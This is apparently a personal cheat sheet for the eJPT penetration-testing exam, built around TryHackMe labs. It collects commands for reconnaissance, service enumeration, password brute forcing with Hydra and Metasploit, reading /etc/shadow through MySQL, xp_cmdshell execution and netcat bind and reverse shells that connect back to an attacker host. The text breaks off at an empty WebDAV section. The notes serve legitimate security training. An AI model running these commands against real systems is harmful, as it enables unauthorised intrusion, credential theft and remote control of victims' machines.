
ADD PAYLOADS FOR WINDOWS AND LINUX SYSTEMS FROM MSFVENOM
# Exam Tips:

ENSURE I PUT THE DRUPAL NOTES HERE

- Make yourself familiar with Webdev platforms like "Drupal" and "Wordpress" and how to attack those.
	- Make sure to use WPSCAN
- crucial to submit the flags as soon as you find it as they change after each reset.
- **Use the exclusion method** for Multi-choice questions. You know there’s only one right answer, so the other three must be wrong.

# TryHackMe Machines

### Enumeration

- [Enumeration](https://tryhackme.com/room/enumerationpe) (Linux & Windows) — **[PAID]**
- [Web Enumeration](https://tryhackme.com/room/webenumerationv2) (Web) — **[PAID]**
- [SimpleCTF](https://tryhackme.com/room/easyctf) (Linux)

### Windows Exploitation

- [Blue](https://tryhackme.com/room/blue)
- [Ice](https://tryhackme.com/room/ice)
- [Blaster](https://tryhackme.com/room/blaster)
- [Retro](https://tryhackme.com/room/retro)
- [Steel Mountain](https://tryhackme.com/room/steelmountain) — **[PAID]**
- [Relevant](https://tryhackme.com/room/relevant)

### Linux Exploitation

- [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)
- [Kenobi](https://tryhackme.com/room/kenobi)
- [Easy Peasy](https://tryhackme.com/room/easypeasyctf) (Hash cracking)
- [Sudo Agent](https://tryhackme.com/room/agentsudoctf) (Priv Esc)
- [RootMe](https://tryhackme.com/room/rrootme) (PrivEsc)
- [What the Shell?](https://tryhackme.com/room/introtoshells) (Shells and Reverse Shells) — **[PAID]**
- [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine) (Brute force)
- [Poster](https://tryhackme.com/room/poster) (PostgreSQL)
- [Chill Hack](https://tryhackme.com/room/chillhack) (SQLi)
- [SkyNet](https://tryhackme.com/room/skynet) (boot2root) — **[PAID]**
- [Startup](https://tryhackme.com/room/startup) (boot2root)
- [GamingServer](https://tryhackme.com/room/gamingserver) (boot2root)

### Privilege Escalation

- [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
- [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
- [Common Linux PrivEsc](https://tryhackme.com/room/commonlinuxprivesc) — **[PAID]**
- [Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
- [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20) — **[PAID]**

### Web & CMS

- [Ignite](https://tryhackme.com/room/ignite) (FuelCMS)
- [Blog](https://tryhackme.com/room/blog) (WordPress)
- [ColdBox: Easy](https://tryhackme.com/room/colddboxeasy) (WordPress)
- [Erit Securus I](https://tryhackme.com/room/eritsecurusi) (BoltCMS) — **[PAID]**
- [Bolt](https://tryhackme.com/room/bolt) (BoltCMS)
- [SQHell](https://tryhackme.com/room/sqhell) (SQLi)

### Pivoting

- [Wreath](https://tryhackme.com/room/wreath) (Windows)
- [Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting) (Windows) — **[PAID]**
- [VulnNet: Internal](https://tryhackme.com/room/vulnnetinternal) (Linux)




# Passive Information Gathering  

## Whois

```
whois <HOST>
whois <IP>
```
## Google Dorking

```
# Targeted site queries
site:target.com                                  # Limits search results to a specific site
site:*.target.com                                # Includes subdomains in search

# Admin panels and login pages
site:*.target.com inurl:login                    # Find login pages
site:*.target.com inurl:admin                    # Find admin pages
site:*.target.com intitle:admin                  # Pages with "admin" in title

# Directory listings / exposed files
site:*.target.com intitle:"index of"            # Directory listing pages
intitle:"index of" "credentials"                # Directories exposing credentials
site:*.target.com inurl:backup                   # Backup files or directories
site:*.target.com inurl:db                       # Database-related files
site:*.target.com inurl:config                   # Configuration files
site:*.target.com inurl:.git                     # Exposed git repositories
site:*.target.com inurl:.env                     # Exposed environment files

# Sensitive files by type
site:*.target.com filetype:pdf                   # PDF files
site:*.target.com filetype:docx                  # Word documents
site:*.target.com filetype:xlsx                  # Excel files
site:*.target.com filetype:sql                   # SQL database dumps
site:*.target.com filetype:log                   # Log files
site:*.target.com filetype:bak                   # Backup files
site:*.target.com filetype:zip                   # Compressed archives

# Passwords / authentication
site:*.target.com inurl:password                 # Password files
site:*.target.com inurl:auth_user_file.txt       # Exposed password directories

# Employees & internal information
site:*.target.com employees                       # Find employee info
site:*.target.com intitle:"staff"                # Staff pages
site:*.target.com intitle:"team"                 # Team pages

# Sitemap / hidden pages
inurl:"robots.txt"                                # Locate robots.txt for hidden pages
inurl:"sitemap.xml"                               # Sitemap info for site structure

# Misc useful searches
site:*.target.com "admin"                        # Pages mentioning "admin"
site:*.target.com "login"                        # Pages mentioning "login"
site:*.target.com "dashboard"                    # Pages with dashboards
site:*.target.com "contact"                      # Contact pages (sometimes lead to emails)
site:*.target.com "internal"                     # Look for internal info
site:*.target.com "confidential"                 # Search for confidential mentions
```

## Email Harvesting 

Using the Harvestor - attempted to use but not really any use.
```
theharvester -d target.com -b all                  # Harvest emails from all available sources
theharvester -d target.com -b linkedin             # Collect employees/emails from LinkedIn
theharvester -d target.com -b pgp                  # Search PGP key servers for emails
```
## Subdomain Enumeration 

This isn't 100% success as the domains might be unindexed etc. 

However still useful to gather information before actively engaging with the target.

https://github.com/aboul3la/Sublist3r

```
sublist3r -d hackersploit.org 
```

## Typical Sub Directories 

```
/robots.txt
/sitemap.xml
/admin/
/admin.php/
/admin.html/
/admin/login/
/login/
/login.php/
/login.html/
/administrator/
/administrator.php/
/administrator/login/
/adminpanel/
/adminpanel.php/
/controlpanel/
/cp/
/cpanel/
/dashboard/
/dashboard.php/
/useradmin/
/backend/
/manager/
/portal/
/wp-admin/
/administrator/
/user/login/
/admin123/
/phpmyadmin/
/pma/
```

## Website Fingerprinting 

The following two tools are browser extensions that can be used to fingerprint websites. The CLI versions of these can be considered active however. 
https://builtwith.com/
https://www.wappalyzer.com/
- **Extension = Passive**
- **CLI/API = Active**

# Active Information Gathering 

## Ping Sweep

Fping 
```
fping -a -g 10.10.23.0/24 2>/dev/null   # Fping is faster than a standard ping for a subnet sweep
```

Nmap
```
nmap -sn 192.168.1.1      # Pings all IPs within the subnet and shows only those that respond
```
## Host Discovery 

Nmap
```
nmap -sn -v -T4 10.2.4.5   # Only tells you whether the host is up; does NOT scan ports; uses verbose and faster scanning flags
```

```
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 10.2.4.5   # Quick scan focusing on likely exploitable ports for the exam
```

## Banner Grabbing 

Netcat banner grab
```
nc 192.105.220.2 22   # Connects to port 22 and retrieves the banner (service/version info)
```

Nmap Banner Grab
```
nmap -sV --script=banner 192.8.94.3   # Uses Nmap service/version detection and banner script to get service info
```


## DNS Enumeration

DNS Dumpster - Tool that will finds subdomains, IPs, mail servers, and DNS records of a target domain.
https://dnsdumpster.com/

DNSrecon

```
dnsrecon -d hackersploit.org
```
## Directory Brute Force


Gobuster

```
# Basic directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt   # Scan directories

# Scan for specific file extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt   # Scan php, html, txt files

# Save results
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt   # Save to file
```

Dirbuster 

```
# Basic directory scan
dirb http://target.com /usr/share/wordlists/dirb/common.txt   # Scan target.com using common wordlist

# Scan for specific file extensions
dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt   # Scan php, html, txt files

# Recursive scan (scan discovered directories)
dirb http://target.com /usr/share/wordlists/dirb/common.txt -r   # Recursively scan directories

# Save results to a file
dirb http://target.com /usr/share/wordlists/dirb/common.txt -o dirb_results.txt   # Save output to file
```


## WAF Detection


```
wafw00f hackersploit.org -a   # Detects Web Application Firewalls (WAFs)  "-a" tests for all possible WAF instances
```


## Active Subdomain

Sublister 

```
sublist3r -d target.com -b brute                  # Enable DNS brute force (active)
```

Amass

```
amass enum -active -d target.com                 # Active enumeration with brute force / DNS resolution
```


## DNS Zone Transfer 

Zone transfers may discover internal IP addresses 
You will often find that corporate networks will misconfigure networks and leak internal address space - which can be useful for targeting with malware

```
nmap --script=dns-zone-transfer -p 53 target.com   # Checks if port 53 allows zone transfer using Nmap script
```

```
fierce -dns zonetransfer.me                        # Attempts DNS zone transfer and subdomain enumeration
fierce --domain hackersploit.org                  # Another way to perform DNS reconnaissance with Fierce
```

 Give the domain name and then the nameserver of the site 
```
host -l zonetransfer.me nsztm.digi.ninja.        # Attempts zone transfer specifying the domain and its nameserver
```

Give the domain name and then the nameserver of the site
```
dig axfr @nsztm1.digi.ninja zonetransfer.me      # Performs zone transfer with dig; lists all DNS records without brute forcing 
```


## Port Scanning + Service Enumeration

## Common Ports

### TCP
| Port     | Service |
| -------- | ------- |
| 21       | FTP     |
| 22       | SSH     |
| 23       | Telnet  |
| 25       | SMTP    |
| 53       | DNS     |
| 80       | HTTP    |
| 110      | POP3    |
| 139, 445 | SMB     |
| 143      | IMAP    |
| 443      | HTTPS   |

### UDP
| Port | Service |
|------|---------|
| 53   | DNS     |
| 67   | DHCP    |
| 68   | DHCP    |
| 69   | TFTP    |
| 161  | SNMP    |

### Other Useful Ports
| Port | Service       |
|------|---------------|
| 1433 | MS SQL Server |
| 3389 | RDP           |
| 3306 | MySQL         |
## NMAP Port Scans 

Run everything Scan - This is an **active and noisy scan** — great for eJPT practice, but not stealthy in the real world.

Below Scan will just run default scripts
```
nmap -sS -A -p- -T4 -sC 192.145.12.4   # Stealth SYN scan, all ports, aggressive detection, and runs default (safe) scripts
```


Runs all scripts on the system - might be overkill so start with above
```
nmap -sS -A -p- -T4 --script=all 192.145.12.4   # Stealth SYN scan, all ports, aggressive detection, and runs ALL NSE scripts
```

Potentially even below is enough to scan most the needed ports
```
nmap -sS -sV -O -sC -T4 192.145.12.4 
```

## Metasploit Port Scanning 

```
# Nmap inside MSF
db_nmap -Pn -sV -O <TARGET_IP>

hosts
services
vulns
loot
creds
notes
```

```
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS <TARGET_IP>
set PORTS 1-1000
run
```

```
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <TARGET_IP>
run
```


## SMB 

Typical port: 445

SMB Enumeration Using NMAP
```
# ----------------------
# SMB Enumeration with Nmap
# ----------------------

# General service detection on SMB
sudo nmap -p 445 -sV -sC -O <TARGET_IP>   # Detects service/version, runs default scripts, and attempts OS detection

# ----------------------
# SMB Protocol & Security Mode
# ----------------------
nmap -p 445 --script smb-protocols <TARGET_IP>          # Detects SMB protocol versions supported
nmap -p 445 --script smb-security-mode <TARGET_IP>      # Checks SMB security level (e.g., signing)

# ----------------------
# SMB Sessions
# ----------------------
nmap -p 445 --script smb-enum-sessions <TARGET_IP>                          # Enumerates SMB sessions (unauthenticated)
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # With credentials

# ----------------------
# SMB Shares
# ----------------------
nmap -p 445 --script smb-enum-shares <TARGET_IP>                            # Lists shares (unauthenticated)
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # With credentials
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # List files in shares

# ----------------------
# SMB Users
# ----------------------
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # Enumerates SMB users

# ----------------------
# SMB Domains, Groups & Services
# ----------------------
nmap -p 445 --script smb-enum-domains --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # Enumerates SMB domains
nmap -p 445 --script smb-enum-groups --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>    # Enumerates SMB groups
nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>  # Enumerates SMB services

# ----------------------
# SMB Server Info
# ----------------------
nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>   # SMB server statistics
nmap -p 445 --script smb-os-discovery <TARGET_IP>                                                    # SMB OS discovery

# ----------------------
# SMB Vulnerability Scan
# ----------------------
nmap -p 445 --script smb-vuln-* <TARGET_IP>   # Runs all SMB vulnerability check scripts


```

```
nmblookup -A <TARGET_IP>   # Enumerates NetBIOS names and services on the target (Windows host discovery)
```

Smbmap enumerate shares 
```
smbmap -u guest -p "" -d . -H <TARGET_IP>   # Attempt login with guest/anonymous access

smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>   # Login with valid credentials

smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'                          # Run a command on the target
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L                                     # List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'                                # List directory contents
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'   # Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'               # Download a file

```

SMB Client Connections
```
smbclient -L <TARGET_IP> -N                          # List shares (NULL/anonymous session)
smbclient -L <TARGET_IP> -U <USER>                   # List shares with authentication
smbclient //<TARGET_IP>/<USER> -U <USER>             # Connect to user share
smbclient //<TARGET_IP>/admin -U admin               # Connect to admin share
smbclient //<TARGET_IP>/public -N                    # Connect to public share (NULL session)

smbclient //<TARGET_IP>/share_name                   # Connect to a specific share
help                                                 # Show available commands
ls                                                   # List directory contents
get <filename>                                       # Download file from share
put <filename>                                       # Upload file to share
```


SMB Bruteforce with Hydra 
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
```

 Metasploit SMB Enumeration and Bruteforce
```
use auxiliary/scanner/smb/smb_version       # Detect SMB version on target
use auxiliary/scanner/smb/smb_enumusers     # Enumerate SMB users
use auxiliary/scanner/smb/smb_enumshares    # Enumerate SMB shares
use auxiliary/scanner/smb/smb_login         # Attempt SMB login brute-force
use auxiliary/scanner/smb/pipe_auditor      # Enumerate accessible named pipes

# set options depends on the selected module  for EJPT will be similar to target.ine.local
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
exploit
```


## FTP

```
sudo nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 -sV -O <TARGET_IP>

nmap -p 21 --script ftp-anon <TARGET_IP>
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

FTP  Brute Force
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
```

Metasploit 
```
# FTP Version Scan
use scanner/ftp/ftp_version
set RHOSTS 
run


# FTP Anon Login
use auxiliary/scanner/ftp/anonymous
set RHOSTS <TARGET_IP>
run

# FTP Brute force with metasploit
use auxiliary/scanner/ftp/ftp_login    
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
run
```

FTP Login
```
# FTP login
ftp <TARGET_IP>

## FTP client
ls
get <filename>
```

## SSH

Enumeration with NMAP
```
# NMAP
sudo nmap -p 22 -sV -sC -O <TARGET_IP>
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>
```

Enumeration with Metasploit 
```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers 


#for both ensure to set RHOSTS to correct target
set RHOSTS <TARGET_IP>

```

SSH Brute Force
```

use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```


Login vis SSH
```
ssh <USER>@<TARGET_IP> 22
ssh root@<TARGET_IP> 22
```

SSH Bruteforce with Hydra
```
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
```

## HTTP

NMAP Enumeration
```
sudo nmap -p 80 -sV -O <TARGET_IP> # Service & OS detection

nmap -p 80 --script=http-enum -sV <TARGET_IP>     # Enumerate common web apps/directories
nmap -p 80 --script=http-headers -sV <TARGET_IP>   # Display HTTP response headers

# Check for allowed HTTP methods (e.g., PUT, DELETE) in /webdav/
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>

```


HTTP Directory Bruteforce
```
dirb http://<TARGET_IP>
dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt
```


 Hydra - HTTP Brute Force
```
# HTTP Basic Auth
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/  
# Brute-force HTTP Basic authentication on /admin/

# HTTP Digest Auth
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/  
# Brute-force HTTP Digest authentication on /admin/

# HTTP POST Form - Basic
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form \
"/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"  
# Brute-force a login form with username admin; stops on "Not allowed" response

# HTTP POST Form - With Cookie
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form \
"/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"  
# Brute-force login form using a specific session cookie
```


HTTP Scanning and Brute force with metasploit 
```

use auxiliary/scanner/http/brute_dirs       # Brute-force directories on the webserver
use auxiliary/scanner/http/robots_txt       # Enumerate robots.txt for disallowed paths
use auxiliary/scanner/http/http_header      # Grab HTTP headers from the server
use auxiliary/scanner/http/http_login       # Perform HTTP login brute-force
use auxiliary/scanner/http/http_version     # Determine web server version

# Global set
setg RHOSTS <TARGET_IP>                     # Target host(s)
setg RHOST <TARGET_IP>                       # Target host


## set options depends on the selected module
set HTTP_METHOD GET                          # HTTP method to use (GET/POST)
set TARGETURI /<DIR>/                         # Target URI for the module
set USER_FILE <USERS_LIST>                   # Username list for login brute-force
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Password list
set VERBOSE false                             # Enable/disable verbose output
set AUTH_URI /<DIR>/                          # URI for authenticated login



exploit
```

## SQL
3
Enumeration with NMAP 
```
# Nmap - MySQL (MariaDB) Checks (port 3306)
# ----------------------

# Service/version and OS detection on MySQL
sudo nmap -p 3306 -sV -O <TARGET_IP>

# Stealth SYN scan, default scripts, service/version detection, and OS detection on MySQL (port 3306)
nmap -p 3306 -sS -sC -sV -O <TARGET_IP>

# Check for empty MySQL root/user passwords
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>

# Get MySQL server info
nmap -p 3306 --script=mysql-info <TARGET_IP>

# Enumerate MySQL users (requires credentials)
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

# List databases (requires credentials)
nmap -p 3306 --script=mysql-databases --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

# Dump server variables (requires credentials)
nmap -p 3306 --script=mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

# Run MySQL audit checks (requires credentials)
nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='<USER>',mysql-audit.password='<PW>',mysql-audit.filename=''" <TARGET_IP>

# Attempt to dump password hashes (requires credentials)
nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>

# Run an arbitrary query (requires credentials)
nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>

# ----------------------
# Nmap - Microsoft SQL (MSSQL) Checks (port 1433)
# ----------------------

# Basic service/version + default scripts on MSSQL
nmap -sV -sC -p 1433 <TARGET_IP>

# Get MSSQL server info
nmap -p 1433 --script=ms-sql-info <TARGET_IP>

# NTLM info from MSSQL (specify instance port if needed)
nmap -p 1433 --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>

# Check for empty MSSQL accounts
nmap -p 1433 --script=ms-sql-empty-password <TARGET_IP>

# Brute-force MSSQL logins using provided wordlists
nmap -p 1433 --script=ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <TARGET_IP>

# Run a query against MSSQL (requires creds) and save output
nmap -p 1433 --script=ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query="SELECT * FROM master..syslogins" <TARGET_IP> -oN output.txt

# Dump password hashes (requires creds)
nmap -p 1433 --script=ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PW> <TARGET_IP>

# Execute xp_cmdshell command (if enabled and creds available)
nmap -p 1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>

# Read a file via xp_cmdshell (if allowed)
nmap -p 1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>
```


Hydra SQL Brute force with username 
```
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql
```

MYSQL Connect to database 
```
# MYSQL
mysql -h <TARGET_IP> -u <USER>
mysql -h <TARGET_IP> -u root

# Mysql client
help
show databases;
use <DB_NAME>;
select count(*) from <TABLE_NAME>;
select load_file("/etc/shadow");
```

Metasploit enumeration for SQL
```
# Global
# ----------------------
# Set target host(s) globally
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

# ----------------------
# METASPLOIT - MySQL Modules
# ----------------------

# Dump MySQL schema information
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# Find writable directories for MySQL
use auxiliary/scanner/mysql/mysql_writable_dirs
set USERNAME <USER>
set PASSWORD <PW>
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE false

# Enumerate sensitive files accessible via MySQL
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME <USER>
set PASSWORD <PW>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set VERBOSE false

# Dump MySQL password hashes
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# MySQL login / brute forcing
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASSWORD ""
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE false

# ----------------------
# METASPLOIT - MSSQL Modules
# ----------------------

# MSSQL login / brute forcing
use auxiliary/scanner/mssql/mssql_login
set USERNAME <USER>
set PASSWORD <PW>
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE false

# General MSSQL enumeration (requires creds for full info)
use auxiliary/admin/mssql/mssql_enum
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# Enumerate MSSQL SQL logins
use auxiliary/admin/mssql/mssql_enum_sql_logins
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false

# Execute commands via MSSQL (xp_cmdshell)
use auxiliary/admin/mssql/mssql_exec
set USERNAME <USER>
set PASSWORD <PW>
set CMD whoami
set VERBOSE false

# Enumerate domain accounts via MSSQL
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set USERNAME <USER>
set PASSWORD <PW>
set VERBOSE false
```


## SMTP

```
sudo nmap -p 25 -sV -sC -O <TARGET_IP>
nmap -sV -script banner <TARGET_IP>
```


```
nc <TARGET_IP> 25
telnet <TARGET_IP> 25
```


```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
```

Metasploit SMTP Enuermation
```
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use auxiliary/scanner/smtp/smtp_enum
```

# Vulnerability Scanning 

Search for NMAP vulnerability scripts
```
ls -al /usr/share/nmap/scripts | grep vuln
```

```
ls -lah /usr/share/nmap/scripts | grep <KEYWORD>
```


# Exploitation 

## Search for Exploits - Searchsploit

https://www.exploit-db.com/

https://www.rapid7.com/db/?type=metasploit

```
searchsploit ssh
searchsploit remote windows smb
searchsploit remote windows buffer

searchsploit remote windows smb
searchsploit remote linux ssh
searchsploit remote linux ssh OpenSSH
searchsploit remote webapps wordpress
searchsploit local windows
searchsploit local windows | grep -e "Microsoft"

```

Copy exploit to path 
```
searchsploit -m /PATH
```
Display 
```
searchsploit -w vsftpd
```
## Search for Exploits - Metasploit


```
search type:exploit name:Microsoft IIS
search eternalblue 
search bluekeep
```


## Metasploit Commands

```
service postgresql start && msfconsole -q
```

```
db_status
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
workspace -a <SERVICE_NAME>
db_nmap -sS -sV -O <TARGET_IP>
# db_nmap -sS -sV -O -p- <TARGET_IP>

# For every exploit, check 'options' and 'info', setup accordingly
```
## Start Metasploit Database

```
service start postgresql 
sudo msfdb init
```
## Meterpreter Stored Data 
```
# List collected loot (files/artifacts)
loot
# Show help for loot
loot -h
# Show details for a loot item
loot
# Download loot item
loot download [path]
# Show DB connection status
db_status
# Export database to a file
db_export
# Run nmap and import results
db_nmap
# List hosts in DB
hosts
# List services in DB
services
# List recorded vulnerabilities
vulns
# Show captured credentials
creds
# List background jobs
jobs
# Verbose jobs (shows output files)
jobs -v
# Kill a job
jobs -k
```

## Meterpreter Shell Upgrade

With an already backgrounded session.
```
use post/multi/manage/shell_to_meterpreter
```

We will now need to configure the module options, more specifically, the LHOST and SESSION ID options, this can be done by running the following commands:

Make sure to replace LHOST with the IP address of your Kali machine.
```
set SESSION 1
set LHOST 192.212.191.2
run
```

Switch to meterpreter sessions
```
sessions
sessions 2
```

or quickest auto option 
```
sessions -u 
```

## Upgrade Shell Linux

spawning a bash session with python
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
spawning a bash session
```
/bin/bash -i
```

## Search for Flags

```
dir C:\Windows\System32\*.txt /s /b
```

Meterpreter Search
```
search -f flag*
```

## Shells

Spawn shells on comprimised
```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
/usr/bin/script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```

```
# Install Netcat on Debian/Ubuntu (or upload nc.exe to target for Windows)
sudo apt update && sudo apt install -y netcat
# (Windows) upload nc.exe to the target if needed

# ----------------------
# Netcat - Basic Connect
# ----------------------
# Connect to a TCP port (simple)
nc <TARGET_IP> <TARGET_PORT>
# Connect with numeric-only host resolution and verbose output
nc -nv <TARGET_IP> <TARGET_PORT>
# UDP connect (numeric only)
nc -nvu <TARGET_IP> <TARGET_UDP_PORT>

# ----------------------
# Netcat - Listener
# ----------------------
# TCP listener on local port
nc -nvlp <LOCAL_PORT>
# UDP listener on local port
nc -nvlup <LOCAL_UDP_PORT>

# ----------------------
# Netcat - File Transfer
# ----------------------
# On the target (receiver) - listen and write incoming data to file
nc -nvlp <PORT> > test.txt
# On the attacker (sender) - send file contents to target
nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
```


```
# Netcat - Bind Shells
# ----------------------
# Windows target: start a bind shell that spawns cmd.exe (target listens)
nc.exe -nvlp <PORT> -e cmd.exe

# Linux target: start a bind shell that spawns /bin/bash (target listens)
nc -nvlp <PORT> -c /bin/bash

# Attacker connects to the bind shell on the target
nc -nv <TARGET_IP> <PORT>
# (Windows attacker) use nc.exe -nv <TARGET_IP> <PORT>

# ----------------------
# Netcat - Reverse Shells
# ----------------------
# Attacker (listening on local machine)
nc -nvlp <PORT>

# Windows target: connect back to attacker and spawn cmd.exe
nc.exe -nv <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe

# Linux target: connect back to attacker and spawn /bin/bash
nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash

# ----------------------
# Notes / Tips
# ----------------------
# - Replace <PORT>, <TARGET_IP>, <ATTACKER_IP>, <ATTACKER_PORT> with actual values.
# - Use the -k flag on listeners to keep them open after disconnects: nc -nvlkp <PORT>
# - Some netcat builds differ: -e may be unavailable for security builds. On Windows use the nc.exe that supports -e.

```
## Host Exploits - Windows

### IIS WEBDAV


To see if a webdav folder is present on the server use the following command which will potentially point out the presence of this folder
```
nmap -sV -p 80 --script=http-enum <TARGET_IP>
```

```
davtest -url <URL>  
# Tests a WebDAV service at the specified URL for enabled HTTP methods and possible file upload vulnerabilities.

davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav 
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav #example 
# Same as above but with HTTP Basic Authentication (username:password) for protected WebDAV endpoints.

cadaver [OPTIONS] <URL>  
# A command-line WebDAV client (like an FTP client) used to interact with the WebDAV server (upload, download, delete, move files, etc.).
```


Brute Force Webdav with Hydra 
```
